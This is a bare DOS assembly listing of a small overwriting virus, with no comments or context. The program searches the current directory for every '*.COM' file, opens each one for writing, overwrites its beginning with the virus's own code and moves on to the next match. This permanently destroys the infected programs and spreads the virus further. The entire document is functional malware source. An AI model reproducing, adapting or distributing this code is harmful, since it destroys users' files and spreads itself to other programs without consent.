Main:           Mov Ah,4eh
On2:            Lea Dx,FileSpec
                Int 21h
                jc on1
                Mov Ax,3d02h
                Mov Dx,9eh
                Int 21h
                Mov bh,40h
                Mov Cl,Length
                Lea Dx,Main
                Xchg Ax,Bx
                Int 21h
                Mov Ah,3eh
                Int 21h
                Mov Ah,4fh
                Jmp On2
On1:            Ret
FileSpec        Db '*.COM',0
Length          Equ $-Main
